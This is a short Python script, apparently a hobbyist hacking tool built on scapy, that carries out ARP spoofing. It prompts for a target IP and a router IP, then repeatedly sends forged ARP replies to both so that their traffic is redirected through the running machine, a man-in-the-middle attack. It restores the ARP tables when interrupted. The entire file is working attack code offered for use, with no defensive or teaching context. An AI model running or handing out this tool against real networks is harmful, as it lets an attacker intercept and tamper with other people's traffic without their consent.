import time
import scapy.all as scapy


def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered[0][1].hwsrc


def form_spoof_packet(target_ip, fake_ip):

    target_mac = get_target_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=fake_ip)
    scapy.send(packet, verbose=False)

    # print(packet.show())
    # print(packet.summary())


def restore(target_ip, original_ip):

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_target_mac(target_ip), psrc=original_ip, hwsrc=get_target_mac(original_ip))
    scapy.send(packet, count=4, verbose=False)
    # print(packet.show())
    # print(packet.summary())


packets_sent_count = 0

target_ip = input("[*] Enter target IP: ")
geateway_ip = input("[*] Enter router IP: ")

while True:
    try:
        form_spoof_packet(target_ip, geateway_ip)
        form_spoof_packet(geateway_ip, target_ip)
        packets_sent_count += 1
        print("\r[+] Packets sent: " + str(packets_sent_count) + " ", end="")
        time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP Table..")
        restore(target_ip, geateway_ip)
        restore(geateway_ip, target_ip)
        exit()
    except:
        print("[!] Target or router is offline. Check your input or try again later.")
        time.sleep(5)
